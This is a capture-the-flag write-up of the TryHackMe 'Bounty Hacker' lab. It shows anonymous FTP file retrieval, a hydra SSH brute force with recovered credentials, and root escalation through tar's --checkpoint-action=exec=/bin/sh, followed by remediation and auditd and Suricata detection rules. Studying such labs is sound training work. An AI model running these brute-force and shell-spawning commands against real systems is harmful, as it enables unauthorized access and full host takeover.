# Bounty Hacker - Anonymous FTP Exfiltration & Privilege Escalation via Tar Checkpoint Execution

**Platform:** TryHackMe | **Target OS:** Linux (Ubuntu 20.04 LTS) | **Difficulty:** Easy  
**Focus:** FTP Architecture & Passive/Active Channel Dynamics, Authentication Brute-Forcing, Linux POSIX Capabilities/SUID, RUID vs. EUID Context Switching, Tar Arbitrary Command Execution

---

## 1. Executive Summary & Attack Chain

During this authorized technical assessment, security posture evaluation was performed against the target host `10.114.164.48` (designated as **Bounty Hacker**). The assessment identified severe configuration weaknesses stemming from unauthenticated legacy service exposure, insecure file permissions, credential re-use, and over-privileged binary execution rights.

The attack path progressed through the following tactical kill-chain:
- **Reconnaissance & Service Identification:** Full TCP port scanning revealed standard attack surfaces: FTP (Port 21), SSH (Port 22), and HTTP (Port 80).
- **Unauthenticated Information Disclosure:** Exploited an insecure `vsftpd` deployment allowing anonymous read access to exfiltrate operational lists (`locks.txt` and `task.txt`), extracting a potential system username (`lin`) and a wordlist.
- **Initial Foothold (SSH Exploitation):** Conducted an automated dictionary attack against OpenSSH utilizing the exfiltrated wordlist, recovering plain-text credentials for the user `lin` and obtaining interactive remote terminal access.
- **Local Privilege Escalation:** Identified elevated binary privileges on `/bin/tar`. After analyzing shell environment privilege dropping (POSIX `dash` behavior stripping Effective UIDs), elevated execution rights were leveraged via `sudo` using GNU `tar` arbitrary command execution hooks (`--checkpoint-action`), culminating in total system takeover (`root`).

---

## 2. Network Reconnaissance & Surface Mapping

An initial service sweep was executed using `nmap` with service version detection (`-sV`), default script engine scripts (`-sC`), and aggressive timing (`-T4`).

```bash
 󰄬 ❯ nmap -sV -sC  -T4 10.114.164.48
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-06 08:43 +0300
Nmap scan report for 10.114.164.48
Host is up (0.097s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.192.28
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:48:d9:3e:fa:5c:35:ba:d7:3c:8c:0e:3d:67:c6:2c (RSA)
|   256 ee:14:f0:3d:1c:23:bc:58:1b:ba:85:75:85:3a:7c:d2 (ECDSA)
|_  256 27:03:58:b5:46:55:58:b1:73:94:d7:e7:32:28:c9:0c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.80 seconds
```

### Network Topology & Port State Mechanics
- **Filtered (`no-response`):** 967 ports returned no TCP packet responses within the timeout threshold. A stateful firewall (or cloud security group) dropped the incoming `SYN` packets without responding with a `RST/ACK` control frame, minimizing information leakage.
- **Closed (`conn-refused`):** 30 ports returned explicit TCP `RST/ACK` packets, indicating that the target operating system's network stack received the packet, verified that no application layer process was bound to the listening socket, and actively rejected the connection according to RFC 793.
- **Open Ports:**
  - **TCP 21 (vsftpd 3.0.5):** Clear-text File Transfer Protocol. Nmap flagged `Anonymous FTP login allowed (FTP code 230)`.
  - **TCP 22 (OpenSSH 8.2p1):** Secure Shell daemon running on Ubuntu Linux.
  - **TCP 80 (Apache httpd 2.4.41):** Standard web server deployment hosting static assets.

---

## 3. Initial Access & Credential Harvesting

### 3.1 Unauthenticated FTP Access & Network Channel Troubleshooting
The File Transfer Protocol (RFC 959) segregates commands and data into distinct TCP streams:
1. **Control Connection (TCP 21):** Carries authentication, directory traversal, and transfer commands.
2. **Data Connection:** Carries raw data transfer (file retrieval, directory listings). In **Active Mode (`PORT`)**, the client opens a high-order ephemeral port and instructs the server to establish a connection back to the client. In **Passive Mode (`PASV`)**, the server opens an ephemeral high port and the client initiates the outbound connection.

During initial interaction, data channel initiation failed (`425 Failed to establish connection` and `550 Permission denied`) due to local firewall restrictions blocking inbound active data streams and misconfigured passive port handling. Once the local filtering rules were relaxed, data channels were established successfully.

```text
 󰄬 ❯ ftp 10.114.164.48
Connected to 10.114.164.48.
220 (vsFTPd 3.0.5)
Name (10.114.164.48:0xZiki): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
ls
clear
^C
^C
exit
^C
^C
^C
^C
^C
^C
425 Failed to establish connection.

receive aborted
waiting for remote to finish abort
ftp> passive
Passive mode on.
ftp> ls
550 Permission denied.
500 Unknown command.
Passive mode refused.
ftp> passive
Passive mode off.
ftp> ls
200 PORT command successful. Consider using PASV.
^C
^C
^C
^C
^C
425 Failed to establish connection.

receive aborted
waiting for remote to finish abort
ftp> ^C
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.0000 seconds (9.9398 Mbytes/s)
ftp> get tesk.txt
200 PORT command successful. Consider using PASV.
550 Failed to open file.
ftp> get task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.0001 seconds (779.6815 kbytes/s)
ftp> exit
?Invalid command
ftp> bye
221 Goodbye.
```

### 3.2 Artifact Exfiltration & Analysis
The retrieved files were inspected locally:

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

The accompanying file `task.txt` provided operational attribution:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Concurrently, inspection of Port 80 rendered static lore/conversational text, serving solely as context without technical exploitation vectors:

```text
### Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."

---

### Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."

---

### Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"

---

### Faye:"..hmph.."
```

The signature `-lin` firmly established `lin` as a prospective valid POSIX local user account. The string entries in `locks.txt` were formatted as high-entropy passwords, making it an ideal targeted wordlist.

### 3.3 Remote Access Exploitation (SSH Brute-Force)
Using `hydra`, an online dictionary attack targeted the SSH service via the exfiltrated parameters:
- **Username:** `lin`
- **Wordlist:** `locks.txt`

```bash
 󰅚 ❯ hydra -l lin -P locks.txt ssh://10.114.164.48
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-06 09:01:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.114.164.48:22/
[22][ssh] host: 10.114.164.48   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-06 09:01:25
```

Valid credentials were recovered: `lin:RedDr4gonSynd1cat3`.

---

## 4. Local Enumeration & Foothold Validation

Authentication via SSH succeeded, dropping execution into the context of standard unprivileged user `lin` (UID 1000). The user flag was accessed on the desktop:

```bash
 ssh lin@10.114.164.48
The authenticity of host '10.114.164.48 (10.114.164.48)' can't be established.
ED25519 key fingerprint is: SHA256:ECk+jPgXsPXZECNObgD2mDoa5kki5CUjVuW0lCAJgag
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.114.164.48' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lin@10.114.164.48's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-114-164-48:~/Desktop$ ls
user.txt
lin@ip-10-114-164-48:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

### SUID File Enumeration
To map local privilege escalation vectors, a search was conducted across the root filesystem for binaries with the SetUID (`SUID`, octal `4000`) bit configured:

```bash
lin@ip-10-114-164-48:~/Desktop$ find / -perm -4000 -type f 2>/dev/null
/snap/core18/2934/bin/mount
/snap/core18/2934/bin/ping
/snap/core18/2934/bin/su
/snap/core18/2934/bin/umount
/snap/core18/2934/usr/bin/chfn
/snap/core18/2934/usr/bin/chsh
/snap/core18/2934/usr/bin/gpasswd
/snap/core18/2934/usr/bin/newgrp
/snap/core18/2934/usr/bin/passwd
/snap/core18/2934/usr/bin/sudo
/snap/core18/2934/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2934/usr/lib/openssh/ssh-keysign
/snap/core24/1055/usr/bin/chfn
/snap/core24/1055/usr/bin/chsh
/snap/core24/1055/usr/bin/gpasswd
/snap/core24/1055/usr/bin/mount
/snap/core24/1055/usr/bin/newgrp
/snap/core24/1055/usr/bin/passwd
/snap/core24/1055/usr/bin/su
/snap/core24/1055/usr/bin/sudo
/snap/core24/1055/usr/bin/umount
/snap/core24/1055/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1055/usr/lib/openssh/ssh-keysign
/snap/core24/1055/usr/lib/polkit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
/usr/lib/snapd/snap-confine
/bin/tar
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

The query returned `/bin/tar`, an unusual and insecure binary to have the SUID bit set.

---

## 5. Privilege Escalation & OS Mechanics

### 5.1 Deep Dive: SUID vs. Shell Privilege Dropping (RUID vs. EUID)
When a binary with the SUID permission bit (`chmod u+s`) is executed, the Linux kernel sets the process's **Effective User ID (`EUID`)** to the owner of the binary file (here, `root`, UID 0), while keeping the **Real User ID (`RUID`)** as the calling user (`lin`, UID 1000).

GNU `tar` supports the `--checkpoint` and `--checkpoint-action` arguments. The `--checkpoint-action=exec=COMMAND` parameter invokes a shell command when an archive checkpoint is hit. 

Initial direct exploitation attempts via SUID failed to retain root privileges:

```bash
lin@ip-10-114-164-48:~/Desktop$ tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
$ whoami
lin
$ tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
$ whoami
lin
$ ls
user.txt
$ cd ..
$ ls
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos
$ cd ..
$ ls
lin  ubuntu
$ cd ..
$ ls
bin  boot  cdrom  dev  etc  home  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
$ cd root
/bin/sh: 9: cd: can't cd to root
```

#### Why did the shell return `lin` instead of `root`?
On modern Ubuntu systems, `/bin/sh` is a symlink to Debian Almquist Shell (`dash`). To defend against SetUID binary exploitation, `dash` implements a security measure upon initialization:
- When invoked, `dash` compares the Real User ID (`getuid()`) and the Effective User ID (`geteuid()`).
- If `RUID != EUID` and the `-p` (privileged) flag is **not** passed, `dash` actively drops privileges by calling `setuid(getuid())`, resetting the `EUID` back to the unprivileged `RUID` (`lin`).
- Because `tar` implicitly calls `/bin/sh -c`, the elevated effective permissions of the SUID bit were stripped immediately upon spawning the subshell.

### 5.2 Sudo Transition & Root Acquisition
By executing `tar` via `sudo` using `lin`'s authenticated context (`RedDr4gonSynd1cat3`), the security model changes:
- `sudo` modifies both the **Real UID** and **Effective UID** to `0` prior to binary execution (`setresuid(0, 0, 0)`).
- When `dash` executes the `--checkpoint-action`, `RUID == EUID == 0`. Consequently, no privilege dropping occurs.

```bash
$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
[sudo] password for lin: 
tar: Removing leading `/' from member names
# whoami
root
# ls
bin  boot  cdrom  dev  etc  home  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap	srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
# cd root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```

Root ownership of the host was validated, and the final administrative flag `THM{80UN7Y_h4cK3r}` was exfiltrated from `/root/root.txt`.

---

## 6. Defensive Remediation & Detection Engineering

### 6.1 Vulnerability Remediation Plan

1. **FTP Service Hardening (`vsftpd`):**
   - Disable anonymous access entirely within `/etc/vsftpd.conf`:
     ```ini
     anonymous_enable=NO
     ```
   - If anonymous access is required, enforce strict chroot jailing (`chroot_local_user=YES`) and restrict access to an isolated directory containing no operational, administrative, or credential-bearing assets.

2. **SSH Authentication Policy:**
   - Enforce cryptographic key-based authentication (`PubkeyAuthentication yes`) and disable plain-text password authentication within `/etc/ssh/sshd_config`:
     ```ini
     PasswordAuthentication no
     ```
   - Implement IP-based connection rate limiting and brute-force mitigation utilities such as `fail2ban`.

3. **Remediation of Dangerous SUID Bits & Sudo Rights:**
   - Strip the SUID bit from binaries capable of arbitrary command execution or system state manipulation:
     ```bash
     chmod u-s /bin/tar
     ```
   - Audit the `/etc/sudoers` configuration and ensure users do not possess unqualified execution rights on archive tools, file pagers, or text editors.

---

### 6.2 Detection Engineering & SIEM Rules

#### Auditd Rule for Arbitrary Tar Command Execution
To detect privilege escalation attempts utilizing `tar` checkpoint execution flags, monitor `execve` system calls where `tar` spawns an interactive shell:

```text
-a always,exit -F arch=b64 -F exe=/bin/tar -F a2=--checkpoint-action -k tar_privesc_checkpoint
-a always,exit -F arch=b64 -F ppid=1 -S execve -F euid=0 -k elevated_subshell_spawn
```

#### Linux Audit Log Analysis
An alert should trigger on any command execution pipeline matching the following pattern in audit records:
```text
type=EXECVE msg=audit(...): argc=4 a0="tar" a1="cf" a2="/dev/null" a3="--checkpoint-action=exec=/bin/sh"
```

#### Suricata / Network Detection Signature (SSH Brute-Force)
Detect repeated failed inbound authentication events over SSH:

```suricata
alert ssh any any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Brute Force Inbound"; flow:to_server,established; threshold:type both, track by_src, count 5, seconds 60; classtype:attempted-recon; sid:2001219; rev:1;)
```
